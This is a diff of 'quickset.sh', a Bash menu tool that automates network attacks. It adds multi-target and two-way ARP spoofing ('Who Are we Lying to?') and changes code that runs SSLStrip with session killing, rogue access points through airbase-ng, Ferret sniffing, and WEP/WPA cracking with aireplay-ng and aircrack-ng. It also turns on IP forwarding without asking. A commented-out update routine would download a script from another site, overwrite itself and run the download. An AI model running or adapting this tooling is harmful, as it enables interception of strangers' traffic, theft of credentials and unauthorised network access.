@@ -3,7 +3,7 @@ function head()
 {
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
-## Version: 0.3.3
+## Version: 0.5
 ## Copyright (C) <2009>  <Snafu>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -73,7 +73,7 @@ function head()
 
 ### Should managed mode channel match monitor mode channel????????
 
-### Figure out if old PIDs are used during a cycle...if not we'll do PID assignments to ensure kill -9s
+### Figure out if old PIDs are used during a power cycle...if not we'll do PID assignments to ensure kill -9s
 ### Use PIDs to make a greppable list
 
 ### Find out why the leases look this way /var/lib/dhcp3/dhcpd.leases
@@ -85,6 +85,8 @@ function head()
 ###  next binding state free;
 
 ### Check for calling of a device or variable to ensure its been set so that quickset.sh doesn't error out....
+
+### Perhaps simplify arpspoof--() with respect towards single/multiple tgts
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -100,21 +102,7 @@ function head()
 
 ## One of the tougher parts of designing this script was weighing in on which programs to include, originally I had decided to implement a KarMetasploit attack.  I later decided against it; instead deciding to focus on smaller programs; with the thought concept that this script is not meant to be an all encompassing tool, but one designed to setup "Quick Fixes".....
 
-
-## On 4 October I encountered the most difficult situation yet.  For some reason, BASH does not like certain combinations within pipes.  After 3 hours of trying every combination I could come up with, I finally was able to make a randomizer for a NIC in monitor mode that would match the physical device with the virtual one.
-
-## rand_mac=`ifconfig $mac_dev | awk '{print $5}'` && rand_mac=`echo $rand_mac | awk '{print $1}'` (Works)
-## -versus-
-## ifconfig $mac_dev | grep HWaddr | awk '{print $5} (Failed to work)
-
-## I have no idea why the later command failed to work, I will investigate this later on.
-
-## Hindsight 20/20 the solution was simple, but it took every ounce of patience I had to keep pursuing the end goal.  This just shows how much dedication really pays off if you want something bad enough.  It's what I've truly come to love about my affliction with hacking.
-
-
 ## For Functions within Functions (sub-functions), I have found that I like to declare my variables for use within a function at the beginning of the function, then I list my sub-functions, at the end of the sub-functions you will find the parent functions commands.  It may be a strange way to do it, but it works for my readability purposes.
-
-## On 15 October a function for ensuring that proper device names are used was instituted.
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -122,32 +110,17 @@ function head()
 ## sed/grep function to check and ensure that when a MAC address is given, it is legit and can be used.
 
 ## Functionality to allow the user the enter device NIC names within the script on the off chance that the user has not already named them during init_setup--().  As of now, failure to fully enter in all required device NICs during init_setup--() will force the user to call naming--() thereby dramatically slowing down the effectivness of quickset.sh for a simple feature that should have already been thought of.
+
+## Sanitization of every input with regards to preventing user error/"hacking (gets me in the mindset for real coding languages in the future to actually think of what I am coding as a whole, and think about how it could be used against the box it is run on exploit wise, all because I failed to account for certain user inputs...Think SQLI)"
+
+## Update capability within the script
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Multiple Sticky Pots are causing issues.  This will probably affect the other two choices for SoftAPs as well.  Found via usage of completly different network settings.  This leads to a loop at the method selection.  Not a script killer, but should be addressed for learning purposes sometime in the near future.  A simple hack to prevent this bug, but not fix it would be to add a variable similar to the dhcpd cleanup function variable for use in seeing if a fake AP already exists.  After I figure out the reason behind the bug, I will decide on whether or not to allow multiple APs.
 
-
-## Airbase-NG is crashing during extended periods of usage. There are a lot of variables to consider with this bug: nmap, ettercap, dhcp3-server, etc...
-
-## I chose to eliminate xterm as a factor by just using: (airbase-ng -c $sac -e "$SSID" $pii &) within the script, hoping for an error message.  I had previously tried a variety of methods to evoke an error message, but was unsuccessful; evidently airbase-ng doesn't like to issue them out with regards to the at0 interface
-
-## I waited a little bit for at0 to not exist anymore, and then issued <crtl+c> within the script.  The idea worked and I was given the following as output: ./quickset.sh: line 1:  1866 Segmentation fault      airbase-ng -c $sac -e "$SSID" $pii
-
-## Of course multiple things were happening when the seg fault issue arose (ettercap, nmap, normal network traffic and such that iPhones like to send out {sending personal information that you never really intended to have sent out in the first place, but that is a story all in itself}.  My next idea was to reboot and start fresh.  I followed my script all the way through the creation of the SoftAP and the DHCP server.  I then connected my iPhone and sent it pings until the interface no longer existed.  The following 3 lines are the final output statistics before I stopped the ping.
-
-## --- 192.168.10.100 ping statistics ---
-## 1103 packets transmitted, 688 received, +1 duplicates, 37% packet loss, time 1106321ms
-## rtt min/avg/max/mdev = 3.402/6.487/12.889/0.974 ms
-
-## I then setup a softap without using a dhcp server; with the following parameters
-## airbase-ng mon0 -c 6 -e "poof"
-## ifconfig at0 up 169.254.191.1 netmask 255.255.255.0
-## Roughly 5 minutes into it a segmentation fault occured
-
-## My next step will be to try this on Lucid Lynx since it is roughly the same
-## Lucid Lynx holding very strong with no segmentation faults
+## Airbase-NG segmentation fault on BT5r1 (32-bit Gnome)
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -160,7 +133,7 @@ function head()
 ## Grant Pearson for having me RTFM with xterm debugging
 
 ## comaX for showing me how much easier it is to follow conditional statements if blank spaces are added in.  This comes in really handy with editors like Kate with folding markers shown.
-## Credit to his script yamas.sh for showing me how to enter multiple inputs for a variable horizontally or vertically.  See custom_dns--() for details of horizontal input
+## Credit for mass_arp--()
 
 ## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -252,7 +225,7 @@ case $init_var in
 	*) init_setup--;;
 esac
 }
-### Begin case hunting here...up through MARK
+
 monitormode--()
 {
 var= ## Nulled
@@ -377,6 +350,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 
 			*) rand= ;;
 		esac
+
 	done
 
 	while [[ $var_II != x ]];do
@@ -410,7 +384,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			if [ $? -ne 0 ];then
 				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
-				read
+				sleep .7
 				mac_control--
 			else
 				rand_mac=`ifconfig $mac_dev | awk '{print $5}'`
@@ -419,7 +393,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 				if [ $? -ne 0 ];then
 					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
 					ifconfig $mac_devII up
-					read
+					sleep .7
 					mac_control--
 				else
 					ifconfig $mac_dev up
@@ -451,14 +425,14 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			if [ $? -ne 0 ];then
 				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
-				read
+				sleep .7
 				mac_control--
 			else
 				echo -e "\033[1;33m\n$mac_devII `macchanger -m $sam $mac_devII`"
 				if [ $? -ne 0 ];then
 					echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
 					ifconfig $mac_devII up
-					read
+					sleep .7
 					mac_control--
 				else
 					ifconfig $mac_dev up
@@ -481,7 +455,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			if [ $? -ne 0 ];then
 				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
-				read
+				sleep .7
 				mac_control--
 			else
 				ifconfig $mac_dev up
@@ -497,7 +471,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			if [ $? -ne 0 ];then
 				echo -e "\033[31mThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
-				read
+				sleep .7
 				mac_control--
 			else
 				ifconfig $mac_dev up
@@ -561,6 +535,7 @@ fi
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 greet--()
 {
+echo "1" > /proc/sys/net/ipv4/ip_forward
 clear
 echo -e "\033[1;34m\n\n\n\n\n\n\n
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -568,16 +543,14 @@ echo -e "\033[1;34m\n\n\n\n\n\n\n
 QuickSet - A Quick Way to Setup a Wired/Wireless Hack
       Author: Snafu ----> will@configitnow.com
            Read Comments Prior to Usage
-           Version 0.3.3 (11 October 2011)\033[1;33m
+           Version 0.5 (16 October 2011)\033[1;33m
 
 
         IP Forwarding via the Kernel Enabled
        Proceed to Routing Features to Disable\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;32m\n\n\n\n
-              PRESS ENTER TO CONTINUE"
-read
-echo "1" > /proc/sys/net/ipv4/ip_forward
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+sleep 2
 ap_check= ## Nulled
 init_setup--
 }
@@ -591,7 +564,7 @@ echo -e "\033[1;32m\nUsage: ./quickset.sh"
 main_menu--()
 {
 # scan_var= ## Variable for determining where Wireless Channel Recon was called from
-trap cleanup-- INT
+trap main_menu-- INT
 clear
 echo -e "\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -624,6 +597,8 @@ case $var in
 	4) atk_menu--;;
 
 	5) routing--;;
+
+# 	6) update--;;
 
 	6) cleanup--;;
 
@@ -845,6 +820,31 @@ esac
 
 exit
 }
+
+update--()
+{
+echo foo
+### Got some work to do here in deciding how I'd like to handle this...Not going to implement it till 0.7
+# ## Updating and running from within self after update!
+# wget -q http://comax.fr/yamas/bt5/version -O /tmp/version # Get last version number
+# last_version=$(cat /tmp/version) #store it to variable
+# rm /tmp/version #remove temp version file
+# if [[ $last_version > $version ]];then # Comparing to current version
+# 	echo -e "You are running version \033[31m$version\033[m, do you want to update to \033[32m$last_version\033[m? (Y/N)"
+# 	read update
+# 	if [[ $update = Y || $update = y ]];then
+# 		echo "[+] Updating script..."
+# 		wget -q http://comax.fr/yamas/bt5/yamas.sh -O $0
+# 		chmod +x $0
+# 		echo "[-] Script updated !"
+# 		cp $0 /usr/bin/yamas
+# 		chmod +x /usr/bin/yamas
+# 		echo "Script should now be installed, launching yamas !"
+# 		sleep 3
+# 		yamas
+# 		exit 1
+# 	fi
+}
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~ setups-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -883,10 +883,8 @@ esac
 
 naming--()
 {
-var= ## Nulled
 clear
-while [ -z $var ];do
-	echo -e "\033[31m\n
+echo -e "\033[31m\n
                         ***WARNING***\033[32m
 Proceeding further will erase all NIC variable names for this script
 Doing so requires that you rename them for this script to work properly\033[31m
@@ -894,9 +892,7 @@ Doing so requires that you rename them for this script to work properly\033[31m
           
 
 \033[36mDo you wish to continue? (y) or (n)\n"
-	read var
-done
-
+read var
 case $var in
 	y|Y) IE= ## Nulled
 	pii= ## Nulled
@@ -1084,20 +1080,17 @@ ferret--()
 			ferret_II--
 		fi;;
 
-		3) var= ## Nulled
-		while [ -z $var ];do
-			echo -e "\033[36m\n1) Wireless\n2) Wired"
-			read var
-			case $var in
-				1) fer_type=Wireless
-				wifi_check=x;;
+		3) echo -e "\033[36m\n1) Wireless\n2) Wired"
+		read var
+		case $var in
+			1) fer_type=Wireless
+			wifi_check=x;;
 
-				2) fer_type=Wired
-				wifi_check=y;;
+			2) fer_type=Wired
+			wifi_check=y;;
 
-				*) var= ;;
-			esac
-		done
+			*) var= ;;
+		esac
 
 		ferret_II--;;
 
@@ -1105,18 +1098,21 @@ ferret--()
 
 		5) main_menu--;;
 
-		6) if [[ -z $fer_dev ]];then
-			echo -e "\033[31mYou Must Choose a Device to Proceed"
+		6) if [[ -z $fer_dev || -z $wifi_check ]];then
+			echo -e "\033[31mSniffing Device and Type Must be Selected to Proceed"
 			read
 			ferret_II--
 		else
 			case $wifi_check in
-				x) echo -e "\033[36m\nWireless Channel to Sniff? (1-11) {6 is null default}"
-				read fer_chan
-				case $fer_chan in
-					1|2|3|4|5|6|7|8|9|10|11) ;;
-					*) fer_chan=6 ;;
-				esac
+				x)fer_chan= ## Nulled
+				while [ -z $fer_chan ];do
+					echo -e "\033[36m\nWireless Channel to Sniff? (1-11)"
+					read fer_chan
+					case $fer_chan in
+						1|2|3|4|5|6|7|8|9|10|11) ;;
+						*) fer_chan= ;;
+					esac
+				done
 
 				xterm -bg black -fg grey -sb -rightbar -title Ferret -e ferret -i $fer_dev --channel $fer_chan & 
 				atk_menu--;;
@@ -1127,13 +1123,13 @@ ferret--()
 
 		fi;;
 
-		*) ferret_II--;;MARK
+		*) ferret_II--;;
 	esac
 	}
 
 ## Below sets my defaults, change as you wish
 if [ -z $pii ];then
-	fer_dev=$IE
+	fer_dev=$IE ## Set to internet conected NIC if no monitor mode device present
 else
 	fer_dev=$pii
 fi
@@ -1145,7 +1141,7 @@ ferret_II--
 
 strip_em--()
 {
-lst_port=48450 ## Port to listen on
+lst_port=10000 ## Port to listen on
 sstrip_log=sstrip_log ## Log Filename
 log_opt="-p" ## Logging option
 lck_fav=Yes ## Favicon Variable
@@ -1207,7 +1203,7 @@ ssl_tail=Yes ## SSLStrip Tail Log
 		2) echo -e "\033[36m\nDefine Log Name"
 		read sstrip_log
 		strip_em_II--;;
-### Sanitize later?
+
 		3) echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
              --Define Logging Options--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
@@ -1222,47 +1218,38 @@ ssl_tail=Yes ## SSLStrip Tail Log
 			1) log_opt="-p" ;;
 			2) log_opt="-s" ;;
 			3) log_opt="-a" ;;
- 			*) log_opt="-p" ;;
+ 			*) log_opt= ;;
 		esac
 
 		strip_em_II--;;
 
-		4) lck_fav= ## Nulled
-		while [ -z $lck_fav ];do
-			echo -e "\033[36mFake a Favicon? (y or n)"
-			read lck_fav
-			case $lck_fav in
-				y|Y) lck_fav=Yes ;;
-				n|N) lck_fav=No ;;
-				*) lck_fav= ;;
-			esac
-		done
+		4) echo -e "\033[36mFake a Favicon? (y or n)"
+		read lck_fav
+		case $lck_fav in
+			y|Y) lck_fav=Yes ;;
+			n|N) lck_fav=No ;;
+			*) lck_fav= ;;
+		esac
 
 		strip_em_II--;;
 
-		5) ses_kil= ## Nulled
-		while [ -z $ses_kil ];do
-			echo -e "\033[36mKill Present Sessions? (y or n)"
-			read ses_kil
-			case $ses_kil in
-				y|Y) ses_kil=Yes ;;
-				n|N) ses_kil=No ;;
-				*) ses_kil= ;;
-			esac
-		done
+		5) echo -e "\033[36mKill Present Sessions? (y or n)"
+		read ses_kil
+		case $ses_kil in
+			y|Y) ses_kil=Yes ;;
+			n|N) ses_kil=No ;;
+			*) ses_kil= ;;
+		esac
 
 		strip_em_II--;;
 
-		6) ssl_tail= ## Nulled
-		while [ -z $ssl_tail= ];do
-			echo -e "\033[36mCreate a Tail of the SSLStrip Log? (y or n)"
-			read ssl_tail
-			case $ssl_tail in
-				y|Y) ssl_tail=Yes ;;
-				n|N) ssl_tail=No ;;
-				*) ssl_tail= ;;
-			esac
-		done
+		6) echo -e "\033[36mCreate a Tail of the SSLStrip Log? (y or n)"
+		read ssl_tail
+		case $ssl_tail in
+			y|Y) ssl_tail=Yes ;;
+			n|N) ssl_tail=No ;;
+			*) ssl_tail= ;;
+		esac
 
 		strip_em_II--;;
 
@@ -1287,42 +1274,112 @@ strip_em_II--
 
 arpspoof--()
 {
+
+	mass_arp--()
+	{
+	if [[ $arp_way = x ]];then
+		while [ "$1" != "" ];do
+			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
+			xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
+			shift
+		done
+
+	else
+		while [ "$1" != "" ];do
+			xterm -bg black -fg grey -hold -title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
+			shift 
+		done
+
+	fi
+	}
+
 var_II= ## Nulled
 var_III= ## Nulled
-echo -e "\033[36m\nDevice to Spoof with?"
-read spoof_dev
-echo -e "\033[36m\nDefine Gateway IP Address (To)"
-read gt_way
+var_IV= ## Nulled
+spoof_dev= ## Device to spoof with
+gt_way= ## Gateway IP variable
+tgt_ip= ## Tgt IP variable
+mult_tgts= ## Variable to assign multiple IPs with
+arp_way= ## Variable to define Two-Way spoofing with multiple IPs
+while [ -z $spoof_dev ];do
+	echo -e "\033[36m\nDevice to Spoof with?"
+	read spoof_dev
+	dev_check_var=$spoof_dev
+	dev_check--
+	if [[ $dev_check = x ]];then
+		spoof_dev= ## Nulled
+	fi
+
+done
+
+while [ -z $gt_way ];do
+	echo -e "\033[36m\nDefine Gateway IP Address (Who Are We Pretending to Be?)"
+	read gt_way
+done
+
 while [[ $var_II != x ]];do
-	echo -e "\033[36m\nArpSpoof Everybody on the Subnet? (y or n)"
+	echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~
+--ArpSpoof Tgts--
+~~~~~~~~~~~~~~~~~\033[36m
+(E)verybody 
+(M)ultiple Tgts
+(S)ingle Tgt\033[1;34m
+~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
-		y|Y) var_II=x
-		xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Subnet" -e arpspoof -i $spoof_dev $gt_way &
+		e|E) var_II=x
+		xterm -bg black -fg grey -title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &
 		atk_menu--;;
 
-		n|N) var_II=x 
-		echo -e "\033[36m\nDefine Target IP address (From)"
-		read tgt_ip
+		m|M) var_II=x
+		while [[ -z $mult_tgts ]];do
+			echo -e "\033[36m\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
+			read mult_tgts
+		done
+
+		while [ -z $var_IV ];do
+			echo -e "\033[36m\nTwo Way Spoof? (y or n)"
+			read var_IV
+			case $var_IV in
+				y|Y) arp_way=x 
+				mass_arp-- $mult_tgts
+				atk_menu--;;
+
+				n|N) mass_arp-- $mult_tgts
+				atk_menu--;;
+
+				*) var_IV= ;;
+			esac
+
+		done;;
+
+		s|S) var_II=x
+		while [ -z $tgt_ip ];do
+			echo -e "\033[36m\nDefine Target IP address (Who Are we Lying to?)"
+			read tgt_ip
+		done
+
 		while [[ $var_III != x ]]; do
 			echo -e "\033[36mTwo Way Spoof? (y or n)"
 			read var
 			case $var in 
-				y|Y) var_III=x 
-				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
-				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Gateway" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
+				y|Y) var_III=x
+				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				xterm -bg black -fg grey -hold -title "ARP to $gt_way (GW) as $tgt_ip" -e arpspoof -i $spoof_dev -t $gt_way $tgt_ip &
 				atk_menu--;;
 
 				n|N) var_III=x
-				xterm -bg black -fg grey -sb -rightbar -title "ArpSpoof Target" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
+				xterm -bg black -fg grey -hold -title "ARP to $tgt_ip as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $tgt_ip $gt_way &
 				atk_menu--;;
 
 				*) var_III= ;;
 			esac
+
 		done;;
 
 		*) var_II= ;;
 	esac
+
 done
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -1365,7 +1422,7 @@ dhcp_dev=at0 ## Device to setup DHCP server on
 sas=192.168.10.0 ## DHCP Subnet 
 sair="192.168.10.100 192.168.10.200" ## DHCP IP range
 dhcp_tail=Yes ## DHCP Tail Log
-dns_cus=No
+dns_cus=No ## Use custom DNS entries for DHCP server, defaulted to nameservers in /etc/resolv.conf
 }
 
 dhcp_svr--()
@@ -1383,6 +1440,7 @@ DHCPDCONF="/tmp/dhcpd.conf" ## Used by dhcpd3
 			for sadns in $1;do
 				echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
 			done
+
 			shift
 		done
 		}
@@ -1414,7 +1472,14 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 	case $var in
 		1) echo -e "\033[36m\nDHCP Server Device?"
 		read dhcp_dev
-		dhcp_func--;;
+		dev_check_var=$dhcp_dev
+		dev_check--
+		if [[ -z $dev_check ]];then
+			dhcp_func--
+		else
+			dhcp_dev= ## Nulled
+			dhcp_func----
+		fi;;
 
 		2) echo -e "\033[36m\nGateway IP Address?"
 		read sapip
@@ -1432,34 +1497,29 @@ DO NOT USE [\033[1;33m`route -n | awk '/UG/ { print $2 }'`\033[31m] FOR THE GATE
 		read sair
 		dhcp_func--;;
 
-		6) dhcp_tail= ## Nulled
-		while [ -z $dhcp_tail ];do
-			echo -e "\033[36mCreate a Tail of the DHCP Log? (y or n)"
-			read dhcp_tail
-			case $dhcp_tail in
-				y|Y) dhcp_tail=Yes ;;
-				n|N) dhcp_tail=No ;;
-				*) dhcp_tail= ;;
-			esac
-		done
+		6) echo -e "\033[36mCreate a Tail of the DHCP Log? (y or n)"
+		read dhcp_tail
+		case $dhcp_tail in
+			y|Y) dhcp_tail=Yes ;;
+			n|N) dhcp_tail=No ;;
+			*) dhcp_tail= ;;
+		esac
 
 		dhcp_func--;;
 
-		7) dns_cus= ## Nulled
-		while [ -z $dns_cus ];do
-			echo -e "\033[36mCreate Custom DNS Entries? (y or n)"
-			read dns_cus
-			case $dns_cus in
-				y|Y) dhcp_tail=Yes 
-				echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
+		7) echo -e "\033[36mCreate Custom DNS Entries? (y or n)"
+		read dns_cus
+		case $dns_cus in
+			y|Y) dhcp_tail=Yes 
+			echo -e "\033[1;32mEnter the desired IP Addressess of the DNS seperated by a space
 i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
-				read dns_entry ;;
+			read dns_entry ;;
 
-				n|N) dns_cus=No ;;
+			n|N) dns_cus=No
+			dhcp_tail=No ;;
 
-				*) dns_cus= ;;
-			esac
-		done
+			*) dns_cus= ;;
+		esac
 
 		dhcp_func--;;
 
@@ -1535,19 +1595,21 @@ i.e.~~~~~>> 192.168.1.1 192.168.1.2 192.168.1.3\n"
 
 if [ -e $DHCPDCONF ] ; then
 	while [ -z $var ];do
-	echo -e "\033[31m\nDHCP Server Configuration File Exists\033[36m\n
+		echo -e "\033[31m\nDHCP Server Configuration File Exists\033[36m\n
 Create New File [\033[31mDeleting /tmp/dhcpd.conf\033[36m] (y or n)?"
-	read var
-	case $var in
-		y|Y) dhcp_func--
-		dhcp_svr_II--;;
+		read var
+		case $var in
+			y|Y) dhcp_func--
+			dhcp_svr_II--;;
 
-		n|N) echo > /var/lib/dhcp3/dhcpd.leases ## Clear any dhcp leases that might have been left behind
-		dhcp_svr_II--;;
+			n|N) echo > /var/lib/dhcp3/dhcpd.leases ## Clear any dhcp leases that might have been left behind
+			dhcp_svr_II--;;
 
-		*) var= ;;
-	esac
+			*) var= ;;
+		esac
+
 	done
+
 else
 	dhcp_func--
 	dhcp_svr_II--
@@ -1616,7 +1678,14 @@ echo -e "\033[1;34m
 case $var in
 	1) echo -e "\033[36m\nSoftAP Physical Device?"
 	read pre_pii
-	ap_setup--;;
+	dev_check_var=$pre_pii
+	dev_check--
+	if [[ -z $dev_check ]];then
+		ap_setup--
+	else
+		pre_pii= ## Nulled
+		ap_setup--
+	fi;;
 
 	2) echo -e "\033[36m\nSoftAP IP Address?"
 	read sapip
@@ -1630,7 +1699,7 @@ case $var in
 	read sac
 	case $sac in
 		1|2|3|4|5|6|7|8|9|10|11) ;;
-		*) sac=6 ;;
+		*) sac= ;;
 	esac
 
 	ap_setup--;;
@@ -1639,16 +1708,13 @@ case $var in
 	read mtu_size
 	ap_setup--;;
 
-	6) dhcp_autol= ## Nulled
-	while [ -z $dhcp_autol ];do
-		echo -e "\033[36mAutolaunch DHCP Server? (y or n)"
-		read dhcp_autol
-		case $dhcp_autol in
-			y|Y) dhcp_autol=Yes ;;
-			n|N) dhcp_autol=No ;;
-			*) dhcp_autol= ;;
- 		esac
-	done
+	6) echo -e "\033[36mAutolaunch DHCP Server? (y or n)"
+	read dhcp_autol
+	case $dhcp_autol in
+		y|Y) dhcp_autol=Yes ;;
+		n|N) dhcp_autol=No ;;
+		*) dhcp_autol= ;;
+	esac
 
 	ap_setup--;;
 
@@ -1681,16 +1747,28 @@ if [ $BB = 1 ]; then
 	clear
 ## bullzeye targets specified ESSID only
 elif [ $BB = 2 ]; then
-	echo -e "\033[36mDesired ESSID?"
-	read SSID
+	SSID= ## Nulled
+	while [ -z $SSID ];do
+		echo -e "\033[36mDesired ESSID?"
+		read SSID
+	done
+
 	xterm -bg black -fg grey -sb -rightbar -title "Bullzeye AP" -e airbase-ng -c $sac -e "$SSID" $pii &
 	clear
 elif [ $BB = 3 ];then
 	private= ## Nulled
-	echo -e "\033[36mDesired ESSID?"
-	read SSID
-	echo -e "\033[36mUse WEP? (y or n)"
-	read var
+	SSID= ## Nulled
+	while  [ -z $SSID ];do
+		echo -e "\033[36mDesired ESSID?"
+		read SSID
+	done
+
+	var= ## Nulled
+	while [ -z $var ];do
+		echo -e "\033[36mUse WEP? (y or n)"
+		read var
+	done
+
 	case $var in
 		y|Y) echo -e "\033[36mPassword?"
 		read wep_pword
@@ -1909,13 +1987,14 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 	pf_var= ## variable name for -w filename
 	echo -e "\033[1;33m"
 	packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w arp-request
-	echo -e "\033[36m\nWhat was the name of the file just created?"
-	read pf_var
+	while [ -z $pf_var ];do
+		echo -e "\033[36m\nWhat was the name of the file just created?"
+		read pf_var
+	done
 	}
 
 	auth--()
 	{
-	var= ## Nulled
 	hid_essid= ## Variable for hidden ESSID
 	echo -e "\033[36m\nAre You Authenticating Against a Hidden ESSID? (y or n)"
 	read var
@@ -1928,6 +2007,7 @@ YOU HAVE KILLED OFF THE ORIGINAL AIRODUMP-NG XTERM SESSION
 		xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" & ;;
 	
 		n|N) xterm -bg black -fg grey -sb -rightbar -title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm & ;;
+
 		*) auth--;;
 	esac
 	}
@@ -2084,7 +2164,7 @@ Client Technique Selection
 	crack--()
 	{
 	aircrack-ng -a 1 -b $b $cf-*.cap
-	echo -e "\033[1;32mYour .cap file starts with ~~~> $cf"
+	echo -e "\033[1;33mYour .cap file starts with ~~~> $cf\n\n\033[1;32mPress Enter to Return to Main Menu"
 	read
 	main_menu--
 	}
@@ -2276,8 +2356,12 @@ Client Technique Selection
 				1) echo -e '\033[36m\nHas a "Fragmentation Attack" arp-request file via packetforge-ng already been created? (y or n)'
 				read arp_made
 				case $arp_made in
-					y|Y) echo -e "\033[36m\nWhat is the name of the arp-request file?"
-					read pf_var
+					y|Y) pf_var= ## Nulled
+					while [ -z $pf_var ];do
+						echo -e "\033[36m\nWhat is the name of the arp-request file?"
+						read pf_var
+					done
+
 					frag_out--
 					arp_made= ;; ## nulled
 
@@ -2298,8 +2382,12 @@ Client Technique Selection
 				2) echo -e '\033[36m\nHas a "Chop Attack" arp-request file via packetforge-ng already been created? (y or n)'
 				read arp_made
 				case $arp_made in
-					y|Y) echo -e "\033[36m\nWhat is the name of the arp-request file?"
-					read pf_var
+					y|Y) pf_var= ## Nulled
+					while [ -z $pf_var ];do
+						echo -e "\033[36m\nWhat is the name of the arp-request file?"
+						read pf_var
+					done
+
 					chop_out--
 					arp_made=  ;; ## nulled
 
@@ -2438,7 +2526,7 @@ Client Technique Selection
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~ WPA-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 	WPA_II--()
 	{
-	#tc= ## Target Channel for WiFi Attacks
+# 	tc= ## Target Channel for WiFi Attacks
 	echo -e "\033[36m\nDesired WiFi Channel for attack? (1-11)"
 	read tc
 ### Need to learn to case within range...Also learn if within range (with sanitization) [1-11]???
@@ -2464,7 +2552,7 @@ Client Technique Selection
 		xterm -bg black -fg grey -sb -rightbar -title "WPA Handshake Grab" -e airbase-ng $pii -c $tc $enc_type -W 1 $all_probe -F ab_$cf & wpa_pid=$! ;;
 	esac
 
